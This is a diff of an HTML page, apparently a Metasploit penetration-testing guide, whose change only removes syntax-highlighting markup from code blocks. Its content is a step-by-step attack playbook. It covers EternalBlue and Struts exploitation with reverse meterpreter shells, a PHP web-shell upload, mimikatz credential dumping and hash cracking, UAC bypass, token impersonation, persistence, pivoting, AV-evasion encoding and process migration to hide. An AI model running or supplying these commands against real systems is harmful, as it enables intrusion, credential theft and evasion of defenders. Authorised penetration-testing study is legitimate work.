-nmap<span class="w"> </span>-sV<span class="w"> </span>--script<span class="w"> </span>vuln<span class="w"> </span>-oX<span class="w"> </span>scan.xml<span class="w"> </span><span class="m">192</span>.168.1.100
+<pre><code># Step 1: Network reconnaissance
+nmap -sV --script vuln -oX scan.xml 192.168.1.100
 
-<span class="c1"># Step 2: Import into Metasploit</span>
+# Step 2: Import into Metasploit
 msfconsole
-db_import<span class="w"> </span>scan.xml
-services<span class="w">  </span><span class="c1"># View discovered services</span>
+db_import scan.xml
+services  # View discovered services
 
-<span class="c1"># Step 3: Search for matching exploit</span>
-search<span class="w"> </span>type:exploit<span class="w"> </span>smb<span class="w"> </span>ms17_010
-use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
+# Step 3: Search for matching exploit
+search type:exploit smb ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
 
-<span class="c1"># Step 4: Configure and exploit</span>
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+# Step 4: Configure and exploit
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
 exploit
 
-<span class="c1"># Step 5: Post-exploitation</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/escalate/ms16_032
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/gather/hashdump
+# Step 5: Post-exploitation
+meterpreter &gt; sysinfo
+meterpreter &gt; getuid
+meterpreter &gt; run post/windows/escalate/ms16_032
+meterpreter &gt; run post/windows/gather/hashdump
 
-<span class="c1"># Step 6: Maintain persistence</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>persistence<span class="w"> </span>-X<span class="w"> </span>-i<span class="w"> </span><span class="m">60</span><span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.1.50
+# Step 6: Maintain persistence
+meterpreter &gt; run persistence -X -i 60 -p 4444 -r 192.168.1.50
 </code></pre>
 </div>
 
@@ -899,33 +888,33 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w
 <p><strong>Goal</strong>: Exploit web vulnerability, gain shell, extract database.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Identify web vulnerability (from nikto/burp)</span>
-<span class="c1"># Apache with PHP, RCE possible via file upload</span>
+<pre><code># Step 1: Identify web vulnerability (from nikto/burp)
+# Apache with PHP, RCE possible via file upload
 
-<span class="c1"># Step 2: Generate PHP payload</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>raw<span class="w"> </span>-o<span class="w"> </span>shell.php
+# Step 2: Generate PHP payload
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f raw -o shell.php
 
-<span class="c1"># Step 3: Set up handler</span>
+# Step 3: Set up handler
 msfconsole
-use<span class="w"> </span>exploit/multi/handler
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>php/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-exploit<span class="w"> </span>-j
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit -j
 
-<span class="c1"># Step 4: Upload payload via vulnerability</span>
-<span class="c1"># Use browser, curl, or Burp to upload shell.php</span>
+# Step 4: Upload payload via vulnerability
+# Use browser, curl, or Burp to upload shell.php
 
-<span class="c1"># Step 5: Trigger shell</span>
-<span class="c1"># Navigate to: http://192.168.1.100/uploads/shell.php</span>
+# Step 5: Trigger shell
+# Navigate to: http://192.168.1.100/uploads/shell.php
 
-<span class="c1"># Step 6: In meterpreter session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>shell
-php<span class="w"> </span>&gt;<span class="w"> </span>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;SELECT * FROM users&quot;</span>
-php<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">exit</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>/var/www/html/config.php
+# Step 6: In meterpreter session
+meterpreter &gt; shell
+php &gt; mysql -u root -p -e &quot;SELECT * FROM users&quot;
+php &gt; exit
+meterpreter &gt; download /var/www/html/config.php
 </code></pre>
 </div>
 
@@ -934,28 +923,28 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>download<span cla
 <p><strong>Goal</strong>: Extract hashes, crack with John, escalate to admin.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Get shell access (via any method)</span>
-<span class="c1"># Already have meterpreter session</span>
+<pre><code># Step 1: Get shell access (via any method)
+# Already have meterpreter session
 
-<span class="c1"># Step 2: Dump password hashes</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/gather/hashdump
-<span class="c1"># or</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>load<span class="w"> </span>mimikatz
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>mimikatz_command<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span>
+# Step 2: Dump password hashes
+meterpreter &gt; run post/windows/gather/hashdump
+# or
+meterpreter &gt; load mimikatz
+meterpreter &gt; mimikatz_command -m &quot;sekurlsa::logonpasswords&quot;
 
-<span class="c1"># Step 3: Save hashes</span>
-<span class="c1"># Copy hash output to: hashes.txt</span>
+# Step 3: Save hashes
+# Copy hash output to: hashes.txt
 
-<span class="c1"># Step 4: Crack with John (on attacker machine)</span>
-john<span class="w"> </span>--format<span class="o">=</span>NT<span class="w"> </span>hashes.txt
-<span class="c1"># or with wordlist</span>
-john<span class="w"> </span>--format<span class="o">=</span>NT<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hashes.txt
+# Step 4: Crack with John (on attacker machine)
+john --format=NT hashes.txt
+# or with wordlist
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
-<span class="c1"># Step 5: Use cracked credentials</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>exploit/windows/local/bypassuac_eventvwr
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>load<span class="w"> </span>incognito
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>list_tokens<span class="w"> </span>-u
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>impersonate_token<span class="w"> </span><span class="s2">&quot;DOMAIN\\Administrator&quot;</span>
+# Step 5: Use cracked credentials
+meterpreter &gt; run exploit/windows/local/bypassuac_eventvwr
+meterpreter &gt; load incognito
+meterpreter &gt; list_tokens -u
+meterpreter &gt; impersonate_token &quot;DOMAIN\\Administrator&quot;
 </code></pre>
 </div>
 
@@ -966,36 +955,36 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>impersonate_token
 <p><strong>Scenario</strong>: Target running Windows 7 without patches; EternalBlue vulnerability present.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-<span class="c1"># Search for EternalBlue</span>
-search<span class="w"> </span>eternalblue
+# Search for EternalBlue
+search eternalblue
 
-<span class="c1"># Use the exploit</span>
-use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
+# Use the exploit
+use exploit/windows/smb/ms17_010_eternalblue
 
-<span class="c1"># Check required options</span>
-show<span class="w"> </span>options
+# Check required options
+show options
 
-<span class="c1"># Required:</span>
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.105
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+# Required:
+set RHOSTS 192.168.1.105
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
 
-<span class="c1"># Optional: Set target (0 = auto, or specify Windows version)</span>
-show<span class="w"> </span>targets
-<span class="nb">set</span><span class="w"> </span>TARGET<span class="w"> </span><span class="m">0</span>
+# Optional: Set target (0 = auto, or specify Windows version)
+show targets
+set TARGET 0
 
-<span class="c1"># Run</span>
+# Run
 exploit
 
-<span class="c1"># Expected session</span>
-<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">192</span>.168.1.105:445<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>target<span class="w"> </span>is<span class="w"> </span>vulnerable.
-<span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">192</span>.168.1.105:445<span class="w"> </span>-<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>target...
-<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">192</span>.168.1.105:445<span class="w"> </span>-<span class="w"> </span>Target<span class="w"> </span>connected.
-<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Payload<span class="w"> </span>sent,<span class="w"> </span>waiting<span class="w"> </span><span class="k">for</span><span class="w"> </span>meterpreter<span class="w"> </span>session.
-<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>opened
+# Expected session
+[+] 192.168.1.105:445 - The target is vulnerable.
+[*] 192.168.1.105:445 - Connecting to target...
+[+] 192.168.1.105:445 - Target connected.
+[*] Payload sent, waiting for meterpreter session.
+[*] Meterpreter session 1 opened
 </code></pre>
 </div>
 
@@ -1004,26 +993,26 @@ exploit
 <p><strong>Scenario</strong>: Apache 2.4.49 web server with CGI script vulnerability.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-search<span class="w"> </span><span class="s2">&quot;Apache mod_cgi bash&quot;</span>
-use<span class="w"> </span>exploit/multi/http/apache_mod_cgi_bash_env_exec
+search &quot;Apache mod_cgi bash&quot;
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-<span class="nb">set</span><span class="w"> </span>TARGETURI<span class="w"> </span>/cgi-bin/test.sh
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444
+set TARGETURI /cgi-bin/test.sh
 
 exploit
 
-<span class="c1"># Resulting meterpreter shell</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
-Computer<span class="w">    </span>:<span class="w"> </span>webserver
-OS<span class="w">          </span>:<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.10.0
-Architecture:<span class="w"> </span>x64
-System<span class="w"> </span>Language<span class="w"> </span>:<span class="w"> </span>en_US
-Logged<span class="w"> </span>In<span class="w"> </span>As<span class="w"> </span>:<span class="w"> </span>nobody
-Meterpreter<span class="w"> </span>:<span class="w"> </span>x86/linux
+# Resulting meterpreter shell
+meterpreter &gt; sysinfo
+Computer    : webserver
+OS          : Linux 5.10.0
+Architecture: x64
+System Language : en_US
+Logged In As : nobody
+Meterpreter : x86/linux
 </code></pre>
 </div>
 
@@ -1032,15 +1021,15 @@ Meterpreter<span class="w"> </span>:<span class="w"> </span>x86/linux
 <p><strong>Scenario</strong>: Apache Struts 2 vulnerable to RCE via OGNL injection.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-search<span class="w"> </span><span class="s2">&quot;struts2&quot;</span><span class="w"> </span>type:exploit
-use<span class="w"> </span>exploit/multi/http/struts_code_exec_showcase
+search &quot;struts2&quot; type:exploit
+use exploit/multi/http/struts_code_exec_showcase
 
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.101
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-<span class="nb">set</span><span class="w"> </span>TARGETURI<span class="w"> </span>/struts2-showcase/
+set RHOSTS 192.168.1.101
+set LHOST 192.168.1.50
+set LPORT 4444
+set TARGETURI /struts2-showcase/
 
 exploit
 </code></pre>
@@ -1051,20 +1040,20 @@ exploit
 <p><strong>Scenario</strong>: PostgreSQL with default credentials accessible.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-use<span class="w"> </span>auxiliary/scanner/postgres/postgres_login
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.102
-<span class="nb">set</span><span class="w"> </span>USERNAME<span class="w"> </span>postgres
-<span class="nb">set</span><span class="w"> </span>PASSWORD<span class="w"> </span>postgres
-<span class="nb">set</span><span class="w"> </span>DATABASE<span class="w"> </span>template1
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 192.168.1.102
+set USERNAME postgres
+set PASSWORD postgres
+set DATABASE template1
 
 run
 
-<span class="c1"># If successful</span>
-use<span class="w"> </span>auxiliary/admin/postgres/postgres_sql
-<span class="nb">set</span><span class="w"> </span>DATABASE<span class="w"> </span>template1
-<span class="nb">set</span><span class="w"> </span>QUERY<span class="w"> </span><span class="s2">&quot;SELECT * FROM pg_user;&quot;</span>
+# If successful
+use auxiliary/admin/postgres/postgres_sql
+set DATABASE template1
+set QUERY &quot;SELECT * FROM pg_user;&quot;
 run
 </code></pre>
 </div>
@@ -1076,12 +1065,12 @@ run
 <p>Create small initial payload that downloads larger meterpreter.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Stage 1: Small executable that downloads stage 2</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-s<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-o<span class="w"> </span>stage1.exe
+<pre><code># Stage 1: Small executable that downloads stage 2
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f exe -s 10000 -o stage1.exe
 
-<span class="c1"># Benefits: Bypasses size restrictions, reduces AV detection signatures</span>
+# Benefits: Bypasses size restrictions, reduces AV detection signatures
 </code></pre>
 </div>
 
@@ -1090,12 +1079,12 @@ msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/re
 <p>Encode payload multiple times with different encoders.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Create encoder chain</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">7</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/jmp_call_additive<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload_polymorphic.exe
+<pre><code># Create encoder chain
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 7 \
+  -e x86/jmp_call_additive -i 3 \
+  -f exe -o payload_polymorphic.exe
 </code></pre>
 </div>
 
@@ -1104,21 +1093,21 @@ msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/re
 <p>Route traffic through compromised system to access internal network.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In meterpreter session on first compromise</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
+<pre><code># In meterpreter session on first compromise
+meterpreter &gt; background
 
-<span class="c1"># Set up route</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span><span class="m">192</span>.168.2.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="m">1</span>
+# Set up route
+msf &gt; route add 192.168.2.0 255.255.255.0 1
 
-<span class="c1"># Now can scan internal network through compromised host</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>auxiliary/scanner/smb/smb_version
-msf<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.2.0/24
-msf<span class="w"> </span>&gt;<span class="w"> </span>run
+# Now can scan internal network through compromised host
+msf &gt; use auxiliary/scanner/smb/smb_version
+msf &gt; set RHOSTS 192.168.2.0/24
+msf &gt; run
 
-<span class="c1"># Exploit internal systems through the route</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
-msf<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.2.50
-msf<span class="w"> </span>&gt;<span class="w"> </span>exploit
+# Exploit internal systems through the route
+msf &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf &gt; set RHOSTS 192.168.2.50
+msf &gt; exploit
 </code></pre>
 </div>
 
@@ -1127,18 +1116,18 @@ msf<span class="w"> </span>&gt;<span class="w"> </span>exploit
 <p>Move meterpreter to different process to avoid detection.</p>
 
 <div class="codehilite">
-<pre><span></span><code>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps
+<pre><code>meterpreter &gt; ps
 
-PID<span class="w">   </span>PPID<span class="w">  </span>Name<span class="w">               </span>Arch<span class="w">  </span>Session<span class="w">  </span>User
----<span class="w">   </span>----<span class="w">  </span>----<span class="w">               </span>----<span class="w">  </span>-------<span class="w">  </span>----
-<span class="m">1234</span><span class="w">  </span><span class="m">1000</span><span class="w">  </span>svchost.exe<span class="w">        </span>x64<span class="w">   </span><span class="m">0</span><span class="w">        </span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM
-<span class="m">5678</span><span class="w">  </span><span class="m">1000</span><span class="w">  </span>explorer.exe<span class="w">       </span>x64<span class="w">   </span><span class="m">1</span><span class="w">        </span>user
+PID   PPID  Name               Arch  Session  User
+---   ----  ----               ----  -------  ----
+1234  1000  svchost.exe        x64   0        NT AUTHORITY\SYSTEM
+5678  1000  explorer.exe       x64   1        user
 
-<span class="c1"># Migrate to explorer.exe (less suspicious)</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>migrate<span class="w"> </span><span class="m">5678</span>
+# Migrate to explorer.exe (less suspicious)
+meterpreter &gt; migrate 5678
 
-<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Migrating<span class="w"> </span>from<span class="w"> </span><span class="m">1234</span><span class="w"> </span>to<span class="w"> </span><span class="m">5678</span>...
-<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>migrated<span class="w"> </span>to<span class="w"> </span>process<span class="w"> </span><span class="m">5678</span>
+[*] Migrating from 1234 to 5678...
+[+] Successfully migrated to process 5678
 </code></pre>
 </div>
 
@@ -1147,14 +1136,14 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>migrate<span clas
 <p>Load custom shellcode for advanced exploitation.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Generate shellcode</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/exec<span class="w"> </span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;calc.exe&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>c<span class="w"> </span>-o<span class="w"> </span>shellcode.txt
+<pre><code># Generate shellcode
+msfvenom -p windows/exec CMD=&quot;calc.exe&quot; \
+  -f c -o shellcode.txt
 
-<span class="c1"># Use in meterpreter</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>shell
-C:<span class="se">\&gt;</span><span class="w"> </span>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/exec<span class="w"> </span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;net user hacker password /add&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>adduser.exe
+# Use in meterpreter
+meterpreter &gt; shell
+C:\&gt; msfvenom -p windows/exec CMD=&quot;net user hacker password /add&quot; \
+  -f exe -o adduser.exe
 </code></pre>
 </div>
 
@@ -1163,93 +1152,93 @@ C:<span class="se">\&gt;</span><span class="w"> </span>msfvenom<span class="w"> 
 <h3 id="tip-1-quick-access-to-global-variables">Tip 1: Quick Access to Global Variables</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Use setg to set once, apply to all modules</span>
-setg<span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.50
-setg<span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-setg<span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+<pre><code># Use setg to set once, apply to all modules
+setg RHOSTS 192.168.1.50
+setg LHOST 192.168.1.50
+setg LPORT 4444
 
-<span class="c1"># Now these are pre-filled for every module</span>
+# Now these are pre-filled for every module
 </code></pre>
 </div>
 
 <h3 id="tip-2-one-liner-exploitation">Tip 2: One-Liner Exploitation</h3>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set LHOST 192.168.1.50; exploit&quot;</span>
+<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set LHOST 192.168.1.50; exploit&quot;
 </code></pre>
 </div>
 
 <h3 id="tip-3-resource-script-automation">Tip 3: Resource Script Automation</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Create reusable scripts for common tasks</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span>scan_and_exploit.rc<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
-<span class="s">db_nmap -sV --script vuln 192.168.1.0/24</span>
-<span class="s">hosts -c address,os_name</span>
-<span class="s">services -c host,port,name,state</span>
-<span class="s">use exploit/windows/smb/ms17_010_eternalblue</span>
-<span class="s">set RHOSTS 192.168.1.100</span>
-<span class="s">exploit -j</span>
-<span class="s">EOF</span>
+<pre><code># Create reusable scripts for common tasks
+cat &gt; scan_and_exploit.rc &lt;&lt; &#39;EOF&#39;
+db_nmap -sV --script vuln 192.168.1.0/24
+hosts -c address,os_name
+services -c host,port,name,state
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+exploit -j
+EOF
 
-msfconsole<span class="w"> </span>-r<span class="w"> </span>scan_and_exploit.rc
+msfconsole -r scan_and_exploit.rc
 </code></pre>
 </div>
 
 <h3 id="tip-4-encoding-multiple-times-increases-bypass-rate">Tip 4: Encoding Multiple Times Increases Bypass Rate</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Higher iterations = more AV evasion but slower payload</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>bypass.exe
+<pre><code># Higher iterations = more AV evasion but slower payload
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o bypass.exe
 </code></pre>
 </div>
 
 <h3 id="tip-5-session-background-foreground">Tip 5: Session Background &amp; Foreground</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Background current session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
+<pre><code># Background current session
+meterpreter &gt; background
 
-<span class="c1"># List all sessions</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>sessions
+# List all sessions
+msf &gt; sessions
 
-<span class="c1"># Interact with specific session</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+# Interact with specific session
+msf &gt; sessions -i 1
 
-<span class="c1"># Run command without interactive shell</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+# Run command without interactive shell
+msf &gt; sessions -c &quot;whoami&quot; -i 1
 </code></pre>
 </div>
 
 <h3 id="tip-6-kill-hanging-sessions">Tip 6: Kill Hanging Sessions</h3>
 
 <div class="codehilite">
-<pre><span></span><code>msf<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w"> </span>-k<span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="c1"># Kill session 1</span>
-msf<span class="w"> </span>&gt;<span class="w"> </span>sessions<span class="w">       </span><span class="c1"># Verify it&#39;s gone</span>
+<pre><code>msf &gt; sessions -k 1  # Kill session 1
+msf &gt; sessions       # Verify it&#39;s gone
 </code></pre>
 </div>
 
 <h3 id="tip-7-database-cleanup">Tip 7: Database Cleanup</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Clear old database (if corrupted)</span>
-msfdb<span class="w"> </span>delete
-msfdb<span class="w"> </span>init
+<pre><code># Clear old database (if corrupted)
+msfdb delete
+msfdb init
 
-<span class="c1"># Or restart PostgreSQL</span>
-systemctl<span class="w"> </span>restart<span class="w"> </span>postgresql
+# Or restart PostgreSQL
+systemctl restart postgresql
 </code></pre>
 </div>
 
 <h3 id="tip-8-check-if-target-is-vulnerable-before-exploiting">Tip 8: Check if Target is Vulnerable Before Exploiting</h3>
 
 <div class="codehilite">
-<pre><span></span><code>use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-check<span class="w">  </span><span class="c1"># Verify vulnerability without executing</span>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+check  # Verify vulnerability without executing
 </code></pre>
 </div>
 
